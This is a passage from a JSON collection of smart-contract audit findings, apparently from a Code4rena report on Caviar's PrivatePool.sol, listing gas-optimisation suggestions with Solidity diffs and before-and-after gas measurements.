      "content": "\nTotal Instances: `2`\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L230-L231\n\n*Gas Savings for `PrivatePool.buy`, obtained via protocol's tests: Avg 289 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  74037   |  158864  |  70884  |    24    |\n| After  |  73713   |  158540  |  70595  |    24    |\n\n```solidity\nFile: src/PrivatePool.sol\n230:        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n231:        virtualNftReserves -= uint128(weightSum);\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..a0813a6 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -227,8 +227,8 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Effects ~~~ //\n\n         // update the virtual reserves\n-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n-        virtualNftReserves -= uint128(weightSum);\n+        virtualBaseTokenReserves = virtualBaseTokenReserves + uint128(netInputAmount - feeAmount - protocolFeeAmount);\n+        virtualNftReserves = virtualNftReserves - uint128(weightSum);\n\n         // ~~~ Interactions ~~~ //\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L323-L324\n\n*Gas Savings for `PrivatePool.sell`, obtained via protocol's tests: Avg 255 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  50139   |  170448  |  81969  |    25    |\n| After  |  49891   |  170138  |  81714  |    25    |\n\n```solidity\nFile: src/PrivatePool.sol\n323:        virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n324:        virtualNftReserves += uint128(weightSum);\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..8a99e47 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -320,8 +320,8 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Effects ~~~ //\n\n         // update the virtual reserves\n-        virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n-        virtualNftReserves += uint128(weightSum);\n+        virtualBaseTokenReserves = virtualBaseTokenReserves - uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n+        virtualNftReserves = virtualNftReserves + uint128(weightSum);\n\n         // ~~~ Interactions ~~~ //\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-06-x--yx---y-costs-more-gas-than-x--x--yx--x---y-for-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "16267",
      "title": "[G-05] Rearrange code to fail early",
      "impact": "GAS",
      "content": "In the instance below, two gas-intensive internal functions are invoked before the `if` statement. If the check causes a revert, the gas consumed in the first two internal functions will not be refunded. Move the `if` statement to the top of the function to save gas for users that trigger a revert.\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L219-L225\n\n*Gas Savings for `PrivatePool.buy`, obtained via protocol's tests: Avg 327 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  74037   |  158864  |  70884  |    24    |\n| After  |  74040   |  158867  |  70557  |    24    |\n\n```solidity\nFile: src/PrivatePool.sol\n219:        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n220:\n221:        // calculate the required net input amount and fee amount\n222:        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n223:\n224:        // check that the caller sent 0 ETH if the base token is not ETH\n225:        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..7465103 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -215,15 +215,15 @@ contract PrivatePool is ERC721TokenReceiver {\n     {\n         // ~~~ Checks ~~~ //\n\n+        // check that the caller sent 0 ETH if the base token is not ETH\n+        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n+\n         // calculate the sum of weights of the NFTs to buy\n         uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n         // calculate the required net input amount and fee amount\n         (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n\n-        // check that the caller sent 0 ETH if the base token is not ETH\n-        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n-\n         // ~~~ Effects ~~~ //\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-05-rearrange-code-to-fail-early",
      "tags": [],
      "finders": []
    },
    {
      "id": "16266",
      "title": "[G-04] Cache state variables outside of loop to avoid reading storage on every iteration",
      "impact": "GAS",
      "content": "Reading from storage should always try to be avoided within loops. In the following instances, we are able to cache state variables outside of the loop to save a `Gwarmaccess (100 gas)` per loop iteration.\n\n**Note: Due to `stack too deep` errors, we will not be able to cache all the state variables read within the loops.** \n\nTotal Instances: `6`\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L238-L271\n\n### Cache `payRoyalties` to avoid storage reads on each loop iteration\n```solidity\nFile: src/PrivatePool.sol\n238:        for (uint256 i = 0; i < tokenIds.length; i++) {\n239:            // transfer the NFT to the caller\n240:            ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n241:\n242:            if (payRoyalties) { // @audit 1st sload + on every iteration\n...\n271:        if (payRoyalties) { // @audit: 2nd sload\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..5d46070 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -216,30 +216,33 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Checks ~~~ //\n\n         // calculate the sum of weights of the NFTs to buy\n-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n+        {\n+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n-        // calculate the required net input amount and fee amount\n-        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n+            // calculate the required net input amount and fee amount\n+            (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n\n-        // check that the caller sent 0 ETH if the base token is not ETH\n-        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n+            // check that the caller sent 0 ETH if the base token is not ETH\n+            if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n\n-        // ~~~ Effects ~~~ //\n+            // ~~~ Effects ~~~ //\n\n-        // update the virtual reserves\n-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n-        virtualNftReserves -= uint128(weightSum);\n+            // update the virtual reserves\n+            virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n+            virtualNftReserves -= uint128(weightSum);\n+        }\n\n         // ~~~ Interactions ~~~ //\n\n         // calculate the sale price (assume it's the same for each NFT even if weights differ)\n         uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length;\n         uint256 royaltyFeeAmount = 0;\n+        bool _payRoyalties = payRoyalties;\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n             // transfer the NFT to the caller\n             ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n\n-            if (payRoyalties) {\n+            if (_payRoyalties) {\n                 // get the royalty fee for the NFT\n                 (uint256 royaltyFee,) = _getRoyalty(tokenIds[i], salePrice);\n\n@@ -268,7 +271,7 @@ contract PrivatePool is ERC721TokenReceiver {\n             if (msg.value > netInputAmount) msg.sender.safeTransferETH(msg.value - netInputAmount);\n         }\n\n-        if (payRoyalties) {\n+        if (_payRoyalties) {\n             for (uint256 i = 0; i < tokenIds.length; i++) {\n                 // get the royalty fee for the NFT\n                 (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L238-L240\n\n### Cache `nft` to avoid storage reads on each loop iteration\n```solidity\nFile: src/PrivatePool.sol\n238:        for (uint256 i = 0; i < tokenIds.length; i++) {\n239:            // transfer the NFT to the caller\n240:            ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]); // @audit: sload on every iteration\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..257beba 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -216,28 +216,31 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Checks ~~~ //\n\n         // calculate the sum of weights of the NFTs to buy\n-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n+        {\n+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n-        // calculate the required net input amount and fee amount\n-        (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n+            // calculate the required net input amount and fee amount\n+            (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n\n-        // check that the caller sent 0 ETH if the base token is not ETH\n-        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n+            // check that the caller sent 0 ETH if the base token is not ETH\n+            if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n\n-        // ~~~ Effects ~~~ //\n+            // ~~~ Effects ~~~ //\n\n-        // update the virtual reserves\n-        virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n-        virtualNftReserves -= uint128(weightSum);\n+            // update the virtual reserves\n+            virtualBaseTokenReserves += uint128(netInputAmount - feeAmount - protocolFeeAmount);\n+            virtualNftReserves -= uint128(weightSum);\n+        }\n\n         // ~~~ Interactions ~~~ //\n\n         // calculate the sale price (assume it's the same for each NFT even if weights differ)\n         uint256 salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length;\n         uint256 royaltyFeeAmount = 0;\n+        address _nft = nft;\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n             // transfer the NFT to the caller\n-            ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n+            ERC721(_nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L329-L333\n\n### Cache `payRoyalties` to avoid storage reads on each loop iteration\n```solidity\nFile: src/PrivatePool.sol\n329:        for (uint256 i = 0; i < tokenIds.length; i++) {\n330:            // transfer each nft from the caller\n331:            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n332:\n333:            if (payRoyalties) { // @audit: sload on every iteration\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..a41a1f5 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -307,30 +307,33 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Checks ~~~ //\n\n         // calculate the sum of weights of the NFTs to sell\n-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n+        {\n+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n-        // calculate the net output amount and fee amount\n-        (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);\n+            // calculate the net output amount and fee amount\n+            (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);\n\n-        //  check the nfts are not stolen\n-        if (useStolenNftOracle) {\n-            IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);\n-        }\n+            //  check the nfts are not stolen\n+            if (useStolenNftOracle) {\n+                IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);\n+            }\n\n-        // ~~~ Effects ~~~ //\n+            // ~~~ Effects ~~~ //\n\n-        // update the virtual reserves\n-        virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n-        virtualNftReserves += uint128(weightSum);\n+            // update the virtual reserves\n+            virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n+            virtualNftReserves += uint128(weightSum);\n+        }\n\n         // ~~~ Interactions ~~~ //\n\n         uint256 royaltyFeeAmount = 0;\n+        bool _payRoyalties = payRoyalties;\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n             // transfer each nft from the caller\n             ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n\n-            if (payRoyalties) {\n+            if (_payRoyalties) {\n                 // calculate the sale price (assume it's the same for each NFT even if weights differ)\n                 uint256 salePrice = (netOutputAmount + feeAmount + protocolFeeAmount) / tokenIds.length;\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L329-L331\n\n### Cache `nft` to avoid storage reads on each loop iteration\n```solidity\nFile: src/PrivatePool.sol\n329:        for (uint256 i = 0; i < tokenIds.length; i++) {\n330:            // transfer each nft from the caller\n331:            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]); // @audit: sload on every iteration\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..70009e1 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -307,28 +307,31 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Checks ~~~ //\n\n         // calculate the sum of weights of the NFTs to sell\n-        uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n+        {\n+            uint256 weightSum = sumWeightsAndValidateProof(tokenIds, tokenWeights, proof);\n\n-        // calculate the net output amount and fee amount\n-        (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);\n+            // calculate the net output amount and fee amount\n+            (netOutputAmount, feeAmount, protocolFeeAmount) = sellQuote(weightSum);\n\n-        //  check the nfts are not stolen\n-        if (useStolenNftOracle) {\n-            IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);\n-        }\n+            //  check the nfts are not stolen\n+            if (useStolenNftOracle) {\n+                IStolenNftOracle(stolenNftOracle).validateTokensAreNotStolen(nft, tokenIds, stolenNftProofs);\n+            }\n\n-        // ~~~ Effects ~~~ //\n+            // ~~~ Effects ~~~ //\n\n-        // update the virtual reserves\n-        virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n-        virtualNftReserves += uint128(weightSum);\n+            // update the virtual reserves\n+            virtualBaseTokenReserves -= uint128(netOutputAmount + protocolFeeAmount + feeAmount);\n+            virtualNftReserves += uint128(weightSum);\n+        }\n\n         // ~~~ Interactions ~~~ //\n\n         uint256 royaltyFeeAmount = 0;\n+        address _nft = nft;\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n             // transfer each nft from the caller\n-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n+            ERC721(_nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L441-L448\n\n### Cache `nft` to avoid storage reads on each loop iteration\n```solidity\nFile: src/PrivatePool.sol\n441:        for (uint256 i = 0; i < inputTokenIds.length; i++) {\n442:            ERC721(nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]); // @audit: sload on every iteration\n443:        }\n444:\n445:        // transfer the output nfts to the caller\n446:        for (uint256 i = 0; i < outputTokenIds.length; i++) {\n447:            ERC721(nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]); // @audit: sload on every iteration\n448:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..5e4e292 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -438,13 +438,14 @@ contract PrivatePool is ERC721TokenReceiver {\n         }\n\n         // transfer the input nfts from the caller\n+        address _nft = nft;\n         for (uint256 i = 0; i < inputTokenIds.length; i++) {\n-            ERC721(nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]);\n+            ERC721(_nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]);\n         }\n\n         // transfer the output nfts to the caller\n         for (uint256 i = 0; i < outputTokenIds.length; i++) {\n-            ERC721(nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]);\n+            ERC721(_nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]);\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L496-L498\n\n### Cache `nft` to avoid storage reads on each loop iteration\n```solidity\nFile: src/PrivatePool.sol\n496:        for (uint256 i = 0; i < tokenIds.length; i++) {\n497:            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]); // @audit: sload on every iteration\n498:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..65eee4c 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -493,8 +493,9 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Interactions ~~~ //\n\n         // transfer the nfts from the caller\n+        address _nft = nft;\n         for (uint256 i = 0; i < tokenIds.length; i++) {\n-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n+            ERC721(_nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n         }\n\n         if (baseToken != address(0)) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-04-cache-state-variables-outside-of-loop-to-avoid-reading-storage-on-every-iteration",
      "tags": [],
      "finders": []
    },
    {
      "id": "16265",
      "title": "[G-03] State variables can be cached instead of re-reading them from storage",
      "impact": "GAS",
      "content": "Caching of a state variable replaces each `Gwarmaccess (100 gas)` with a much cheaper stack read.\n\n**Note: Some view functions are included below since they are called within state mutating functions**\n\nTotal Instances: `16`\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L742-L746\n\n### Cache `baseToken` to save 1 SLOAD\n```solidity\nFile: src/PrivatePool.sol\n742:    function price() public view returns (uint256) {\n743:        // ensure that the exponent is always to 18 decimals of accuracy\n744:        uint256 exponent = baseToken == address(0) ? 18 : (36 - ERC20(baseToken).decimals()); // @audit: 1st & 2nd sload\n745:        return (virtualBaseTokenReserves * 10 ** exponent) / virtualNftReserves;\n746:    }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..2f747fc 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -741,7 +741,8 @@ contract PrivatePool is ERC721TokenReceiver {\n     /// @return price The price of the pool.\n     function price() public view returns (uint256) {\n         // ensure that the exponent is always to 18 decimals of accuracy\n-        uint256 exponent = baseToken == address(0) ? 18 : (36 - ERC20(baseToken).decimals());\n+        address _baseToken = baseToken;\n+        uint256 exponent = _baseToken == address(0) ? 18 : (36 - ERC20(_baseToken).decimals());\n         return (virtualBaseTokenReserves * 10 ** exponent) / virtualNftReserves;\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L731-L738\n\n### Cache `baseToken` to save 1 SLOAD\n```solidity\nFile: src/PrivatePool.sol\n    function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) { \n        // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n        uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4; // @audit: 1st and 2nd sload\n        uint256 feePerNft = changeFee * 10 ** exponent;\n\n        feeAmount = inputAmount * feePerNft / 1e18;\n        protocolFeeAmount = feeAmount * Factory(factory).protocolFeeRate() / 10_000;\n    }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..aba824f 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -730,7 +730,8 @@ contract PrivatePool is ERC721TokenReceiver {\n     /// @return protocolFeeAmount The protocol fee amount.\n     function changeFeeQuote(uint256 inputAmount) public view returns (uint256 feeAmount, uint256 protocolFeeAmount) {\n         // multiply the changeFee to get the fee per NFT (4 decimals of accuracy)\n-        uint256 exponent = baseToken == address(0) ? 18 - 4 : ERC20(baseToken).decimals() - 4;\n+        address _baseToken = baseToken;\n+        uint256 exponent = _baseToken == address(0) ? 18 - 4 : ERC20(_baseToken).decimals() - 4;\n         uint256 feePerNft = changeFee * 10 ** exponent;\n\n         feeAmount = inputAmount * feePerNft / 1e18;\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L661-L684\n\n### Cache `merkleRoot` to save 1 SLOAD\n```solidity\nFile: src/PrivatePool.sol\n661:    function sumWeightsAndValidateProof(\n662:        uint256[] memory tokenIds,\n663:        uint256[] memory tokenWeights,\n664:        MerkleMultiProof memory proof\n665:    ) public view returns (uint256) {\n666:        // if the merkle root is not set then set the weight of each nft to be 1e18\n667:        if (merkleRoot == bytes32(0)) { // @audit: 1st sload\n668:            return tokenIds.length * 1e18;\n669:        }\n670:\n671:        uint256 sum;\n672:        bytes32[] memory leafs = new bytes32[](tokenIds.length);\n673:        for (uint256 i = 0; i < tokenIds.length; i++) {\n674:            // create the leaf for the merkle proof\n675:            leafs[i] = keccak256(bytes.concat(keccak256(abi.encode(tokenIds[i], tokenWeights[i]))));\n676:\n677:            // sum each token weight\n678:            sum += tokenWeights[i];\n679:        }\n680:\n681:        // validate that the weights are valid against the merkle proof\n682:        if (!MerkleProofLib.verifyMultiProof(proof.proof, merkleRoot, leafs, proof.flags)) { // @audit: 2nd sload\n683:            revert InvalidMerkleProof();\n684:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..7385ea9 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -664,7 +664,8 @@ contract PrivatePool is ERC721TokenReceiver {\n         MerkleMultiProof memory proof\n     ) public view returns (uint256) {\n         // if the merkle root is not set then set the weight of each nft to be 1e18\n-        if (merkleRoot == bytes32(0)) {\n+        bytes32 _merkleRoot = merkleRoot;\n+        if (_merkleRoot == bytes32(0)) {\n             return tokenIds.length * 1e18;\n         }\n\n@@ -679,7 +680,7 @@ contract PrivatePool is ERC721TokenReceiver {\n         }\n\n         // validate that the weights are valid against the merkle proof\n-        if (!MerkleProofLib.verifyMultiProof(proof.proof, merkleRoot, leafs, proof.flags)) {\n+        if (!MerkleProofLib.verifyMultiProof(proof.proof, _merkleRoot, leafs, proof.flags)) {\n             revert InvalidMerkleProof();\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L635-L651\n\n### Cache `baseToken` to save 2 SLOADs\n```solidity\nFile: src/PrivatePool.sol\n635:        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount(); // @audit: 1st sload\n636:\n637:        // transfer the NFT to the borrower\n638:        ERC721(token).safeTransferFrom(address(this), address(receiver), tokenId);\n639:\n640:        // call the borrower\n641:        bool success =\n642:            receiver.onFlashLoan(msg.sender, token, tokenId, fee, data) == keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n643:\n644:        // check that flashloan was successful\n645:        if (!success) revert FlashLoanFailed();\n646:\n647:        // transfer the NFT from the borrower\n648:        ERC721(token).safeTransferFrom(address(receiver), address(this), tokenId);\n649:\n650:        // transfer the fee from the borrower\n651:        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee); // @audit: 2nd & 3rd sload\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..c8b3cc1 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -632,7 +632,8 @@ contract PrivatePool is ERC721TokenReceiver {\n         uint256 fee = flashFee(token, tokenId);\n\n         // if base token is ETH then check that caller sent enough for the fee\n-        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n+        address _baseToken = baseToken;\n+        if (_baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n\n         // transfer the NFT to the borrower\n         ERC721(token).safeTransferFrom(address(this), address(receiver), tokenId);\n@@ -648,7 +649,7 @@ contract PrivatePool is ERC721TokenReceiver {\n         ERC721(token).safeTransferFrom(address(receiver), address(this), tokenId);\n\n         // transfer the fee from the borrower\n-        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);\n+        if (_baseToken != address(0)) ERC20(_baseToken).transferFrom(msg.sender, address(this), fee);\n\n         return success;\n     }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L489-L503\n\n### Cache `baseToken` to save 3 SLOADs\n```solidity\nFile: src/PrivatePool.sol\n489:        if ((baseToken == address(0) && msg.value != baseTokenAmount) || (msg.value > 0 && baseToken != address(0))) { // @audit: 1st & 2nd sload\n490:            revert InvalidEthAmount();\n491:        }\n492:\n493:        // ~~~ Interactions ~~~ //\n494:\n495:        // transfer the nfts from the caller\n496:        for (uint256 i = 0; i < tokenIds.length; i++) {\n497:            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n498:        }\n499:\n500:        if (baseToken != address(0)) { // @audit: 3rd sload\n501:            // transfer the base tokens from the caller\n502:            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), baseTokenAmount); // @audit: 4th sload\n503:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..92349e1 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -486,7 +486,8 @@ contract PrivatePool is ERC721TokenReceiver {\n\n         // ensure the caller sent a valid amount of ETH if base token is ETH or that the caller sent 0 ETH if base token\n         // is not ETH\n-        if ((baseToken == address(0) && msg.value != baseTokenAmount) || (msg.value > 0 && baseToken != address(0))) {\n+        address _baseToken = baseToken;\n+        if ((_baseToken == address(0) && msg.value != baseTokenAmount) || (msg.value > 0 && _baseToken != address(0))) {\n             revert InvalidEthAmount();\n         }\n\n@@ -497,9 +498,9 @@ contract PrivatePool is ERC721TokenReceiver {\n             ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n         }\n\n-        if (baseToken != address(0)) {\n+        if (_baseToken != address(0)) {\n             // transfer the base tokens from the caller\n-            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), baseTokenAmount);\n+            ERC20(_baseToken).safeTransferFrom(msg.sender, address(this), baseTokenAmount);\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L397-L426\n\n### Cache `baseToken` to save 3 SLOADs\n```solidity\nFile: src/PrivatePool.sol\n397:        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount(); // @audit: 1st sload\n...\n421:        if (baseToken != address(0)) { // @audit: 2nd sload\n422:            // transfer the fee amount of base tokens from the caller\n423:            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), feeAmount); // @audit: 3rd sload\n424:\n425:            // if the protocol fee is non-zero then transfer the protocol fee to the factory\n426:            if (protocolFeeAmount > 0) ERC20(baseToken).safeTransferFrom(msg.sender, factory, protocolFeeAmount); // @audit: 4th sload\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..912790f 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -394,7 +394,8 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Checks ~~~ //\n\n         // check that the caller sent 0 ETH if base token is not ETH\n-        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n+        address _baseToken = baseToken;\n+        if (_baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n\n         // check that NFTs are not stolen\n         if (useStolenNftOracle) {\n@@ -418,12 +419,12 @@ contract PrivatePool is ERC721TokenReceiver {\n\n         // ~~~ Interactions ~~~ //\n\n-        if (baseToken != address(0)) {\n+        if (_baseToken != address(0)) {\n             // transfer the fee amount of base tokens from the caller\n-            ERC20(baseToken).safeTransferFrom(msg.sender, address(this), feeAmount);\n+            ERC20(_baseToken).safeTransferFrom(msg.sender, address(this), feeAmount);\n\n             // if the protocol fee is non-zero then transfer the protocol fee to the factory\n-            if (protocolFeeAmount > 0) ERC20(baseToken).safeTransferFrom(msg.sender, factory, protocolFeeAmount);\n+            if (protocolFeeAmount > 0) ERC20(_baseToken).safeTransferFrom(msg.sender, factory, protocolFeeAmount);\n         } else {\n             // check that the caller sent enough ETH to cover the fee amount and protocol fee\n             if (msg.value < feeAmount + protocolFeeAmount) revert InvalidEthAmount();\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L357-L369\n\n### Cache `baseToken` to save 2 SLOADs\n```solidity\nFile: src/PrivatePool.sol\n357:        if (baseToken == address(0)) { // @audit: 1st sload\n358:            // transfer ETH to the caller\n359:            